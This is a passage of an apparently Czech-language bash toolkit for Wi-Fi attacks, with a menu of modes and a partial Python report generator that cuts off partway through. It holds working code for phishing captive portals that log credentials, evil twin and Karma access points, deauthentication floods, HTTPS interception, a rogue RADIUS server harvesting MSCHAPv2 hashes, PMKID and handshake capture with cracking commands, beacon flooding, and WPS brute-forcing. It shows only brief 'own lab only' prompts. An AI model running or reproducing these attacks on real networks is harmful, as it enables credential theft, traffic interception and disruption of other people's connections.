    [ "$TERM_CMD" = "tmux" ] && tmux kill-session -t kukackap 2>/dev/null || true
    rm -f "$WORK_DIR"/.term_*.sh 2>/dev/null
    echo "${G}[+] Hotovo. Logy: $LOG_DIR${N}"
    exit 0
}
trap cleanup INT TERM

wait_for_user() {
    attach_tmux_if_needed
    echo
    echo "${C}════════════════════════════════════════════${N}"
    echo "${G}  ${BOLD}ENTER${N}${G} = stop & cleanup${N}"
    echo "${C}════════════════════════════════════════════${N}"
    read -r
    cleanup
}

# === MODY ===
mode_open_ap() {
    echo "${B}═══ MODE 1: Open AP + DHCP + NAT ═══${N}"
    prepare_iface; write_hostapd_open; write_dnsmasq; setup_nat
    launch_hostapd; launch_dnsmasq; launch_leases
    wait_for_user
}

mode_wpa2_ap() {
    echo "${B}═══ MODE 2: WPA2 AP + DHCP + NAT ═══${N}"
    read -p "Heslo (min 8 znaků): " pw
    [ ${#pw} -lt 8 ] && { echo "Příliš krátké"; exit 1; }
    prepare_iface; write_hostapd_wpa2 "$pw"; write_dnsmasq; setup_nat
    launch_hostapd; launch_dnsmasq; launch_leases
    echo "${G}[+] WPA2 SSID '$SSID' / heslo: $pw${N}"
    wait_for_user
}

mode_pcap() {
    echo "${B}═══ MODE 3: Open AP + plný pcap ═══${N}"
    prepare_iface; write_hostapd_open; write_dnsmasq; setup_nat
    launch_hostapd; launch_dnsmasq; launch_tcpdump; launch_leases
    wait_for_user
}

mode_mitm() {
    echo "${B}═══ MODE 4: MITM HTTPS proxy ═══${N}"
    if ! check_tool mitmweb; then
        echo "${R}[!] mitmweb chybí. Nainstaluj:${N}"
        echo "    sudo apt install pipx && pipx install mitmproxy"
        exit 1
    fi
    prepare_iface; write_hostapd_open; write_dnsmasq
    setup_nat; setup_mitm_redirect
    launch_hostapd; launch_dnsmasq; launch_mitm; launch_leases
    echo "${Y}[*] Klient: http://mitm.it pro CA cert${N}"
    echo "${Y}[*] Web UI: http://$AP_IP:8081${N}"
    wait_for_user
}

mode_captive_portal() {
    echo "${B}═══ MODE 5: Captive Portal ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní zařízení / autorizace!${N}"
    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && exit 0
    echo
    printf "${Y}Šablona portálu:${N}\n"
    printf "  ${G}1)${N} Apple iOS style\n"
    printf "  ${G}2)${N} Android Material\n"
    printf "  ${G}3)${N} Corporate / Firemní\n"
    read -p "Volba [1]: " tmpl
    tmpl="${tmpl:-1}"
    prepare_iface
    write_hostapd_open
    write_dnsmasq_sinkhole
    write_captive_portal_server
    case "$tmpl" in
        2) write_portal_html_android; echo "${G}[+] Šablona: Android Material${N}" ;;
        3) write_portal_html_corp;    echo "${G}[+] Šablona: Corporate${N}" ;;
        *) write_portal_html_apple;   echo "${G}[+] Šablona: Apple iOS${N}" ;;
    esac
    sysctl -w net.ipv4.ip_forward=0 >/dev/null
    iptables -t nat -F
    iptables -F FORWARD
    launch_hostapd; launch_dnsmasq; launch_dnsqueries; launch_portal
    open_term "credentials" "sudo touch $LOG_DIR/credentials.log; sudo tail -F $LOG_DIR/credentials.log"
    echo "${G}[+] Captive portal aktivní${N}"
    wait_for_user
}

mode_evil_twin() {
    echo "${B}═══ MODE 6: Evil Twin ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && exit 0
    echo "${Y}[*] Skenuji okolí přes $UPSTREAM...${N}"
    iw dev "$UPSTREAM" scan 2>/dev/null | awk '
        /^BSS / {bssid=$2; gsub(/\(.*/,"",bssid)}
        /freq:/ {freq=$2}
        /signal:/ {signal=$2}
        /SSID:/ {ssid=substr($0, index($0,$2));
                 if (ssid != "" && ssid != "\\x00") printf "%-20s %-30s %s dBm  %s MHz\n", bssid, ssid, signal, freq}
    ' | sort -u | head -30 | nl
    echo
    read -p "Cílový SSID: " target_ssid
    read -p "Cílový BSSID [Enter pro nepoužít]: " target_bssid
    read -p "Kanál [$CHANNEL]: " target_ch
    [ -n "$target_ch" ] && CHANNEL="$target_ch"
    SSID="$target_ssid"
    prepare_iface
    write_hostapd_open "$target_ssid" "$target_bssid"
    write_dnsmasq
    setup_nat
    launch_hostapd; launch_dnsmasq; launch_leases
    if check_tool aireplay-ng && [ -n "$target_bssid" ]; then
        echo
        read -p "Spustit deauth flood proti $target_bssid? (y/N): " do_deauth
        if [ "$do_deauth" = "y" ]; then
            read -p "Monitor interface: " mon_if
            [ -n "$mon_if" ] && open_term "deauth" "sudo aireplay-ng --deauth 0 -a $target_bssid $mon_if"
        fi
    fi
    echo "${G}[+] Evil Twin '$target_ssid' běží${N}"
    wait_for_user
}

mode_karma() {
    echo "${B}═══ MODE 7: Karma ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní lab!${N}"
    if ! check_tool airbase-ng; then
        echo "${R}[!] airbase-ng chybí: sudo apt install aircrack-ng${N}"
        exit 1
    fi
    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && exit 0
    pkill hostapd 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type monitor
    ip link set "$AP_IFACE" up
    iw dev "$AP_IFACE" set channel "$CHANNEL"
    mkdir -p "$WORK_DIR" "$LOG_DIR"
    open_term "airbase-karma" "cd $LOG_DIR && sudo airbase-ng -P -C 30 -e Internet -c $CHANNEL $AP_IFACE"
    sleep 3
    if ip link show at0 &>/dev/null; then
        ip addr add "$AP_IP/24" dev at0
        ip link set at0 up
        write_dnsmasq
        sed -i "s|interface=$AP_IFACE|interface=at0|" "$WORK_DIR/dnsmasq.conf"
        sysctl -w net.ipv4.ip_forward=1 >/dev/null
        iptables -t nat -F; iptables -F FORWARD
        iptables -t nat -A POSTROUTING -o "$UPSTREAM" -j MASQUERADE
        iptables -A FORWARD -i at0 -o "$UPSTREAM" -j ACCEPT
        iptables -A FORWARD -i "$UPSTREAM" -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
        launch_dnsmasq; launch_leases
        echo "${G}[+] Karma aktivní${N}"
    else
        echo "${Y}[!] at0 nevznikl, zkontroluj airbase okno${N}"
    fi
    wait_for_user
}

mode_handshake_capture() {
    echo "${B}═══ MODE 8: WPA2 + EAPOL handshake ═══${N}"
    read -p "Heslo (min 8): " pw
    [ ${#pw} -lt 8 ] && { echo "Příliš krátké"; exit 1; }
    prepare_iface; write_hostapd_wpa2 "$pw"; write_dnsmasq; setup_nat
    launch_hostapd; launch_dnsmasq; launch_leases; launch_eapol_capture
    echo "${G}[+] Handshake -> $LOG_DIR/eapol-*.pcap${N}"
    echo "${Y}[*] Crack: aircrack-ng -w wordlist.txt $LOG_DIR/eapol-*.pcap${N}"
    wait_for_user
}

mode_monitor() {
    echo "${B}═══ MODE 9: Pasivní 802.11 monitor ═══${N}"
    pkill hostapd 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type monitor
    ip link set "$AP_IFACE" up
    iw dev "$AP_IFACE" set channel "$CHANNEL"
    PCAP="$LOG_DIR/wifi-$(date +%H%M%S).pcap"
    mkdir -p "$LOG_DIR"
    open_term "monitor-pcap" "echo Soubor: $PCAP; sudo tcpdump -i $AP_IFACE -w $PCAP"
    open_term "live-mgmt" "sudo tcpdump -i $AP_IFACE -nn -e 'type mgt' 2>/dev/null"
    open_term "probe-req" "sudo tcpdump -i $AP_IFACE -nn -e 'type mgt subtype probe-req' 2>/dev/null"
    wait_for_user
}

mode_wpa3_ap() {
    echo "${B}═══ MODE 10: WPA3-SAE AP + DHCP + NAT ═══${N}"
    local phy
    phy=$(iw dev "$AP_IFACE" info 2>/dev/null | awk '/wiphy/{print "phy"$2}')
    if [ -n "$phy" ] && ! iw "$phy" info 2>/dev/null | grep -q "SAE"; then
        echo "${Y}[!] Upozornění: karta nebo hostapd nemusí podporovat SAE/WPA3${N}"
        read -p "Pokračovat? (y/N): " ok
        [ "$ok" != "y" ] && return
    fi
    read -p "Heslo (min 8 znaků): " pw
    [ ${#pw} -lt 8 ] && { echo "${R}Příliš krátké${N}"; return; }
    prepare_iface
    write_hostapd_wpa3 "$pw"
    write_dnsmasq
    setup_nat
    launch_hostapd
    launch_dnsmasq
    launch_leases
    echo "${G}[+] WPA3-SAE SSID '$SSID' / heslo: $pw${N}"
    wait_for_user
}

mode_multi_ssid() {
    echo "${B}═══ MODE 11: Multi-SSID ═══${N}"
    echo "${Y}[i] Vytvoří 2 SSID na jedné kartě (open + volitelně WPA2)${N}"
    read -p "SSID 1 — open [$SSID]: " ssid1
    [ -z "$ssid1" ] && ssid1="$SSID"
    read -p "SSID 2: " ssid2
    [ -z "$ssid2" ] && ssid2="Corp-$(date +%H%M)"
    read -p "Heslo pro SSID 2 (Enter = open): " pass2

    prepare_iface
    write_hostapd_multi "$ssid1" "$ssid2" "$pass2"
    launch_hostapd
    sleep 3

    if ip link show "$MULTI_IFACE2" &>/dev/null; then
        ip addr flush dev "$MULTI_IFACE2" 2>/dev/null || true
        ip addr add "$MULTI_AP_IP2/24" dev "$MULTI_IFACE2"
        ip link set "$MULTI_IFACE2" up
        echo "${G}[+] Virtuální iface $MULTI_IFACE2 = $MULTI_AP_IP2${N}"
    else
        echo "${Y}[!] Virtuální rozhraní $MULTI_IFACE2 nevzniklo — zkontroluj hostapd okno${N}"
    fi

    write_dnsmasq_multi
    setup_nat_multi
    launch_dnsmasq
    launch_leases

    echo "${G}[+] SSID 1: '$ssid1' (open)  → 10.0.0.x${N}"
    echo "${G}[+] SSID 2: '$ssid2' $([ -n "$pass2" ] && echo "(WPA2)" || echo "(open)") → 10.0.1.x${N}"
    wait_for_user
}

mode_pmkid_capture() {
    echo "${B}═══ MODE 12: PMKID Capture ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"
    if ! check_tool hcxdumptool; then
        echo "${R}[!] hcxdumptool chybí: sudo apt install hcxdumptool${N}"
        read -p "ENTER..."; return
    fi
    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && return

    pkill hostapd 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type monitor 2>/dev/null || true
    ip link set "$AP_IFACE" up
    mkdir -p "$LOG_DIR"

    local ts; ts=$(date +%H%M%S)
    local pcap="$LOG_DIR/pmkid-${ts}.pcapng"

    read -p "Cílový BSSID (Enter = vše): " target_bssid
    local filter_arg=""
    if [ -n "$target_bssid" ]; then
        local filter_file="$WORK_DIR/pmkid_filter.txt"
        echo "$target_bssid" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$filter_file"
        filter_arg="--filterlist_ap=$filter_file --filtermode=2"
    fi

    open_term "hcxdumptool" "sudo hcxdumptool -i $AP_IFACE -o $pcap --active_beacon --enable_status=1 $filter_arg 2>&1 | tee $LOG_DIR/hcxdumptool.log"
    echo "${G}[+] Zachytávám PMKID → $pcap${N}"
    echo "${Y}[*] Ctrl+C v okně hcxdumptool = stop, pak ENTER zde${N}"
    echo
    echo "${C}════════════════════════════════════════════${N}"
    echo "${G}  ${BOLD}ENTER${N}${G} = stop & konverze do hashcat${N}"
    echo "${C}════════════════════════════════════════════${N}"
    read -r

    pkill hcxdumptool 2>/dev/null || true
    sleep 1
    nmcli device set "$AP_IFACE" managed yes 2>/dev/null || true

    if check_tool hcxpcapngtool && [ -f "$pcap" ]; then
        local hash="$LOG_DIR/pmkid-${ts}.hc22000"
        hcxpcapngtool -o "$hash" "$pcap" 2>/dev/null
        if [ -s "$hash" ]; then
            local count; count=$(wc -l < "$hash")
            echo "${G}[+] Hash uložen: $hash  ($count záznamů)${N}"
            echo "${Y}[*] Crack: hashcat -m 22000 $hash wordlist.txt${N}"
        else
            echo "${Y}[!] Žádný PMKID/handshake nebyl zachycen${N}"
        fi
    else
        echo "${Y}[i] hcxpcapngtool chybí → sudo apt install hcxtools${N}"
        echo "    Pcap: $pcap"
    fi
    echo; read -p "ENTER..."
}

mode_rogue_radius() {
    echo "${B}═══ MODE 13: WPA-Enterprise / Rogue RADIUS ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní lab / autorizace!${N}"
    if ! check_tool hostapd-wpe; then
        echo "${R}[!] hostapd-wpe chybí: sudo apt install hostapd-wpe${N}"
        read -p "ENTER..."; return
    fi
    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && return

    local CERT_DIR="$WORK_DIR/certs"
    mkdir -p "$CERT_DIR" "$LOG_DIR"

    if [ -d /etc/hostapd-wpe/certs ] && [ -f /etc/hostapd-wpe/certs/server.pem ]; then
        cp /etc/hostapd-wpe/certs/{ca.pem,server.pem,server.key,dh} "$CERT_DIR/" 2>/dev/null || true
        echo "${G}[+] Používám systémové certifikáty hostapd-wpe${N}"
    elif [ ! -f "$CERT_DIR/server.pem" ]; then
        echo "${Y}[*] Generuji self-signed certifikáty (může trvat ~15 s)...${N}"
        openssl req -new -x509 -nodes -days 365 \
            -out "$CERT_DIR/ca.pem" -keyout "$CERT_DIR/ca.key" \
            -subj "/CN=WirelessCA/O=Lab/C=CZ" 2>/dev/null
        openssl req -new -nodes \
            -out "$CERT_DIR/server.csr" -keyout "$CERT_DIR/server.key" \
            -subj "/CN=WirelessServer/O=Lab/C=CZ" 2>/dev/null
        openssl x509 -req -days 365 \
            -in "$CERT_DIR/server.csr" -CA "$CERT_DIR/ca.pem" \
            -CAkey "$CERT_DIR/ca.key" -CAcreateserial \
            -out "$CERT_DIR/server.pem" 2>/dev/null
        openssl dhparam -out "$CERT_DIR/dh" 1024 2>/dev/null
        echo "${G}[+] Certifikáty vygenerovány v $CERT_DIR${N}"
    else
        echo "${G}[+] Certifikáty nalezeny v $CERT_DIR${N}"
    fi

    cat > "$WORK_DIR/eap_users" <<'EOF'
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPv2,MD5,GTC,TTLS-EAP,MSCHAPV2 "" [2]
EOF

    cat > "$WORK_DIR/ap-wpe.conf" <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
ieee8021x=1
eap_server=1
eap_user_file=$WORK_DIR/eap_users
ca_cert=$CERT_DIR/ca.pem
server_cert=$CERT_DIR/server.pem
private_key=$CERT_DIR/server.key
dh_file=$CERT_DIR/dh
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
wpe_logfile=$LOG_DIR/wpe-creds.log
EOF

    prepare_iface
    open_term "hostapd-wpe" "sudo hostapd-wpe $WORK_DIR/ap-wpe.conf 2>&1 | tee $LOG_DIR/wpe.log"
    sleep 3
    write_dnsmasq
    setup_nat
    launch_dnsmasq
    open_term "wpe-creds" "touch $LOG_DIR/wpe-creds.log; sudo tail -F $LOG_DIR/wpe-creds.log"

    echo "${G}[+] Rogue RADIUS AP '$SSID' aktivní${N}"
    echo "${Y}[*] MSCHAPv2 hashe → $LOG_DIR/wpe-creds.log${N}"
    echo "${Y}[*] Crack: asleap -C <challenge> -R <response> -W wordlist.txt${N}"
    echo "${Y}       nebo: hashcat -m 5500 hash.txt wordlist.txt${N}"
    wait_for_user
}

mode_beacon_flood() {
    echo "${B}═══ MODE 14: Beacon Flood ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní lab!${N}"
    if ! check_tool mdk4; then
        echo "${R}[!] mdk4 chybí: sudo apt install mdk4${N}"
        read -p "ENTER..."; return
    fi
    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && return

    pkill hostapd 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type monitor
    ip link set "$AP_IFACE" up
    mkdir -p "$LOG_DIR"

    echo "${Y}Typ beacon flood:${N}"
    echo "  1) Náhodné SSID (generované mdk4)"
    echo "  2) SSID ze souboru"
    echo "  3) Jedno SSID s náhodným BSSID (AP jam)"
    read -p "Volba [1]: " flood_type
    flood_type="${flood_type:-1}"

    case "$flood_type" in
        1)
            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
            ;;
        2)
            local ssid_file="$WORK_DIR/ssid_list.txt"
            read -p "Cesta k souboru se SSID [$ssid_file]: " f
            [ -n "$f" ] && ssid_file="$f"
            if [ ! -f "$ssid_file" ]; then
                echo "${Y}[*] Vytvářím ukázkový seznam SSID...${N}"
                printf '%s\n' FreeWifi eduroam Starbucks_Guest Corp-Network \
                    "iPhone hotspot" linksys NETGEAR xfinitywifi > "$ssid_file"
            fi
            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -f $ssid_file -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
            ;;
        3)
            read -p "SSID k opakování [$SSID]: " flood_ssid
            [ -z "$flood_ssid" ] && flood_ssid="$SSID"
            open_term "beacon-flood" "sudo mdk4 $AP_IFACE b -e \"$flood_ssid\" -c $CHANNEL 2>&1 | tee $LOG_DIR/beacon-flood.log"
            ;;
    esac

    echo "${G}[+] Beacon flood aktivní na kanálu $CHANNEL${N}"
    wait_for_user
}

mode_wps_attack() {
    echo "${B}═══ MODE 15: WPS Pixie Dust / Bruteforce ═══${N}"
    echo "${R}[!] LEGAL: pouze vlastní AP / autorizace!${N}"

    local tool=""
    if check_tool reaver; then tool="reaver"
    elif check_tool bully; then tool="bully"
    else
        echo "${R}[!] Chybí reaver nebo bully: sudo apt install reaver${N}"
        read -p "ENTER..."; return
    fi

    read -p "Pokračovat? (y/N): " ok
    [ "$ok" != "y" ] && return

    pkill hostapd 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type monitor
    ip link set "$AP_IFACE" up
    mkdir -p "$LOG_DIR"

    if check_tool wash; then
        echo "${Y}[*] Skenuji WPS AP přes $AP_IFACE (15 s)...${N}"
        echo
        printf "${W}%-18s %-4s %-5s %-4s %-3s %s${N}\n" "BSSID" "Ch" "dBm" "WPS" "Lck" "ESSID"
        printf "${W}%s${N}\n" "────────────────────────────────────────────────"
        timeout 15 sudo wash -i "$AP_IFACE" 2>/dev/null | grep -v "^Wash\|^--\|BSSID" || true
        echo
    else
        echo "${Y}[!] wash chybí — sken WPS AP přeskočen${N}"
    fi

    read -p "Cílový BSSID: " target_bssid
    [ -z "$target_bssid" ] && { echo "${R}BSSID povinný${N}"; return; }
    read -p "Kanál cíle: " target_ch
    [ -n "$target_ch" ] && iw dev "$AP_IFACE" set channel "$target_ch" 2>/dev/null

    echo "${Y}Typ útoku:${N}"
    echo "  1) Pixie Dust (rychlý offline útok — doporučeno)"
    echo "  2) PIN bruteforce (pomalý, ~4h)"
    read -p "Volba [1]: " attack_type
    attack_type="${attack_type:-1}"

    local log_file="$LOG_DIR/wps-$(date +%H%M%S).log"
    case "$tool" in
        reaver)
            if [ "$attack_type" = "1" ]; then
                open_term "pixiedust" "sudo reaver -i $AP_IFACE -b $target_bssid -K 1 -vv 2>&1 | tee $log_file"
            else
                open_term "wps-brute" "sudo reaver -i $AP_IFACE -b $target_bssid -vv 2>&1 | tee $log_file"
            fi
            ;;
        bully)
            if [ "$attack_type" = "1" ]; then
                open_term "pixiedust" "sudo bully $AP_IFACE -b $target_bssid --pixiedust 2>&1 | tee $log_file"
            else
                open_term "wps-brute" "sudo bully $AP_IFACE -b $target_bssid 2>&1 | tee $log_file"
            fi
            ;;
    esac

    echo "${G}[+] WPS útok zahájen ($tool / $([ "$attack_type" = "1" ] && echo "Pixie Dust" || echo "bruteforce"))${N}"
    echo "${Y}[*] Log: $log_file${N}"
    wait_for_user
}

mode_channel_hopper() {
    echo "${B}═══ MODE 16: Channel Hopper + Probe Collector ═══${N}"
    pkill hostapd 2>/dev/null || true
    nmcli device set "$AP_IFACE" managed no 2>/dev/null || true
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type monitor 2>/dev/null || true
    ip link set "$AP_IFACE" up
    mkdir -p "$LOG_DIR"

    echo "${Y}Rozsah kanálů:${N}"
    echo "  1) 2.4 GHz (1–13)"
    echo "  2) 5 GHz (36,40,44,48,52,56,60,64,100,104,108,112,116,149,153,157,161,165)"
    echo "  3) Oba pásma"
    read -p "Volba [1]: " band
    band="${band:-1}"

    local ch24="1 2 3 4 5 6 7 8 9 10 11 12 13"
    local ch5="36 40 44 48 52 56 60 64 100 104 108 112 116 149 153 157 161 165"
    local channels
    case "$band" in
        2) channels="$ch5" ;;
        3) channels="$ch24 $ch5" ;;
        *) channels="$ch24" ;;
    esac

    read -p "Prodleva na kanálu [0.3s]: " delay
    delay="${delay:-0.3}"

    local ts; ts=$(date +%H%M%S)
    local pcap="$LOG_DIR/chanhop-${ts}.pcap"
    local probe_log="$LOG_DIR/probes-${ts}.txt"

    # Hopper skript — $channels, $AP_IFACE, $delay expandovány zde; \$ch zůstane jako $ch v souboru
    local hopper="$WORK_DIR/chanhop.sh"
    cat > "$hopper" <<HOPEOF
#!/bin/bash
echo "[*] Hopper start — kanály: $channels"
while true; do
    for ch in $channels; do
        printf "\r[*] Kanál: \$ch   "; iw dev $AP_IFACE set channel \$ch 2>/dev/null; sleep $delay
    done
done
HOPEOF
    chmod +x "$hopper"

    open_term "ch-hopper"   "sudo bash $hopper"
    sleep 0.5
    open_term "pcap-full"   "sudo tcpdump -i $AP_IFACE -w $pcap -U 2>/dev/null; echo Uloženo: $pcap"
    open_term "probe-req"   "sudo tcpdump -i $AP_IFACE -nn -e 'type mgt subtype probe-req' 2>/dev/null | tee -a $probe_log"
    open_term "ap-beacons"  "sudo tcpdump -i $AP_IFACE -nn -e 'type mgt subtype beacon' 2>/dev/null | grep -oE '\([^)]+\)' | grep -v '^\(\)$' | awk '!seen[\$0]++'"

    echo "${G}[+] Channel hopper aktivní ($(echo $channels | wc -w) kanálů, ${delay}s/kanál)${N}"
    echo "${Y}[*] Probe log: $probe_log${N}"
    echo "${Y}[*] Pcap:      $pcap${N}"
    wait_for_user
}

mode_client_overview() {
    echo "${B}═══ MODE 17: Živý přehled klientů ═══${N}"
    if ! pgrep -x hostapd &>/dev/null && ! pgrep -x hostapd-wpe &>/dev/null; then
        echo "${Y}[!] hostapd neběží — nejprve spusť AP mód (1–3, 10, 11, 13...)${N}"
        read -p "ENTER..."; return
    fi

    local refresh=3
    read -p "Interval obnovy [${refresh}s]: " r
    [ -n "$r" ] && refresh="$r"

    local monitor_script="$WORK_DIR/clients.sh"
    # Jednoduchý heredoc — $AP_IFACE atd. expandovány při zápisu; vnitřní $1/$2 jsou argumenty generovaného skriptu
    cat > "$monitor_script" <<MONEOF
#!/bin/bash
IFACE="$AP_IFACE"; REFRESH="$refresh"; LOG_DIR="$LOG_DIR"
R=\$'\033[0;31m'; G=\$'\033[0;32m'; Y=\$'\033[1;33m'
C=\$'\033[0;36m'; W=\$'\033[1;37m'; N=\$'\033[0m'

parse_stations() {
    iw dev "\$IFACE" station dump 2>/dev/null | awk '
        /^Station /  { if (mac) print mac,sig,tx,rx,pkts; mac=\$2; sig="?"; tx="?"; rx="?"; pkts="?" }
        /signal:/    { sig=\$2 }
        /tx bitrate:/{ tx=\$3 }
        /rx bitrate:/{ rx=\$3 }
        /rx packets:/{ pkts=\$3 }
        END          { if (mac) print mac,sig,tx,rx,pkts }
    '
}

while true; do
    clear
    printf "\${C}╔══════════════════════════════════════════════════════════╗\${N}\n"
    printf "\${C}║  Živý přehled klientů — \${W}%s\${C}   %s  ║\${N}\n" "\$IFACE" "\$(date '+%H:%M:%S')"
    printf "\${C}╠══════════════════════════════════════════════════════════╣\${N}\n"
    printf "\${W}  %-17s  %-8s  %-8s  %-8s  %-8s  %-15s\${N}\n" "MAC" "Signal" "TX Mbit" "RX Mbit" "RX pkt" "IP"
    printf "\${W}  %s\${N}\n" "────────────────────────────────────────────────────────"
    count=0
    while read -r mac sig tx rx pkts; do
        count=\$((count+1))
        ip=\$(arp -n 2>/dev/null | awk -v m="\$mac" 'tolower(\$3)==tolower(m){print \$1;exit}')
        [ -z "\$ip" ] && ip=\$(grep -i "\$mac" "\$LOG_DIR/dnsmasq.log" 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | tail -1)
        [ -z "\$ip" ] && ip="-"
        if [ "\$sig" != "?" ] && [ "\$sig" -ge -50 ] 2>/dev/null; then sc="\$G"
        elif [ "\$sig" != "?" ] && [ "\$sig" -ge -70 ] 2>/dev/null; then sc="\$Y"
        else sc="\$R"; fi
        printf "  %-17s  \${sc}%-8s\${N}  %-8s  %-8s  %-8s  %-15s\n" \
            "\$mac" "\${sig} dBm" "\$tx" "\$rx" "\$pkts" "\$ip"
    done < <(parse_stations)
    printf "\${C}╠══════════════════════════════════════════════════════════╣\${N}\n"
    printf "\${C}║  Klientů: \${W}%-3d\${C}  │  refresh: %ss  │  Ctrl+C = konec      ║\${N}\n" "\$count" "\$REFRESH"
    printf "\${C}╚══════════════════════════════════════════════════════════╝\${N}\n"
    sleep "\$REFRESH"
done
MONEOF
    chmod +x "$monitor_script"
    open_term "klienti" "sudo bash $monitor_script"
    echo "${G}[+] Přehled klientů spuštěn (refresh ${refresh}s)${N}"
    read -p "ENTER..."
}

mode_html_report() {
    echo "${B}═══ MODE 18: HTML Report ═══${N}"
    [ ! -d "$LOG_DIR" ] && {
        echo "${R}[!] Žádné logy — nejprve spusť nějaký mód${N}"; read -p "ENTER..."; return
    }
    local ts; ts=$(date +%Y%m%d-%H%M%S)
    local report="$WORK_DIR/report-${ts}.html"
    echo "${Y}[*] Generuji report...${N}"

    python3 - "$LOG_DIR" "$report" "$AP_IFACE" "$SSID" "$CHANNEL" <<'PYEOF'
import sys, os, re, glob, datetime, html as esc

LOG_DIR, REPORT, AP_IFACE, SSID, CHANNEL = sys.argv[1:]

def read_lines(*paths):
    lines = []
    for p in paths:
        try:
            with open(p, encoding='utf-8', errors='replace') as f:
                lines.extend(f.readlines())
        except: pass
    return lines

def count_matches(pattern, *paths):
    n = 0
    for p in paths:
        try:
            with open(p, encoding='utf-8', errors='replace') as f:
                n += sum(1 for l in f if re.search(pattern, l))
        except: pass
    return n

creds     = read_lines(f"{LOG_DIR}/credentials.log", f"{LOG_DIR}/wpe-creds.log")
dhcp_cnt  = count_matches(r"DHCPACK", f"{LOG_DIR}/dnsmasq.log")
dns_cnt   = count_matches(r"query\[", f"{LOG_DIR}/dnsmasq.log")
probe_files = glob.glob(f"{LOG_DIR}/probes-*.txt")
hash_files  = glob.glob(f"{LOG_DIR}/*.hc22000")
pmkid_lines = read_lines(*hash_files)
probe_lines = read_lines(*probe_files)
cred_cnt  = len([l for l in creds if l.strip()])
pmkid_cnt = len([l for l in pmkid_lines if l.strip()])

# Top DNS
dns_domains = {}
for f in [f"{LOG_DIR}/dnsmasq.log"]:
    try:
        for l in open(f, encoding='utf-8', errors='replace'):
            m = re.search(r'query\[\w+\] (\S+)', l)
            if m: dns_domains[m.group(1)] = dns_domains.get(m.group(1), 0) + 1
    except: pass
top_dns = sorted(dns_domains.items(), key=lambda x: -x[1])[:20]

# Top probes
probe_ssids = {}
for l in probe_lines:
    for m in re.findall(r'\(([^)]+)\)', l):
        if m: probe_ssids[m] = probe_ssids.get(m, 0) + 1
top_probes = sorted(probe_ssids.items(), key=lambda x: -x[1])[:20]

# DHCP leases
dhcp_rows = []
try:
    for l in open(f"{LOG_DIR}/dnsmasq.log", encoding='utf-8', errors='replace'):
        if 'DHCPACK' not in l: continue
        ts = ' '.join(l.split()[:2]) if l else ''
        ip_m = re.search(r'DHCPACK\(?\S*?\)?\s+(\d+\.\d+\.\d+\.\d+)', l)
        mac_m = re.search(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', l, re.I)
        host_m = re.search(r'[0-9a-f:]{17}\s+(\S+)', l, re.I)
        ip = ip_m.group(1) if ip_m else '-'
        mac = mac_m.group(1) if mac_m else '-'
        host = host_m.group(1) if host_m else '-'
        if ip != '-' and (ip, mac) not in [(r[1], r[2]) for r in dhcp_rows]:
            dhcp_rows.append((ts, ip, mac, host))
except: pass

now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def stat_card(val, label, color='blue'):
    return f'<div class="stat {color}"><div class="val">{val}</div><div class="lbl">{label}</div></div>'

def section(title, content):
    return f'<section><h2>{title}</h2>{content}</section>\n'

def table(headers, rows, empty="Žádná data"):
    if not rows:
        return f'<div class="empty">{empty}</div>'
    ths = ''.join(f'<th>{h}</th>' for h in headers)
    trs = ''
    for row in rows:
        tds = ''.join(f'<td>{c}</td>' for c in row)
        trs += f'<tr>{tds}</tr>'
    return f'<table><tr>{ths}</tr>{trs}</table>'

CSS = '''
:root{--bg:#0d1117;--sf:#161b22;--br:#30363d;--tx:#c9d1d9;--mu:#8b949e;
      --gr:#3fb950;--rd:#f85149;--yw:#d29922;--bl:#58a6ff;--pu:#bc8cff}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--tx);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.6}
header{background:var(--sf);border-bottom:1px solid var(--br);padding:18px 28px}
header h1{font-size:20px;color:var(--bl);margin-bottom:4px}
header .meta{color:var(--mu);font-size:12px}
.stats{display:flex;gap:14px;padding:18px 28px;flex-wrap:wrap}
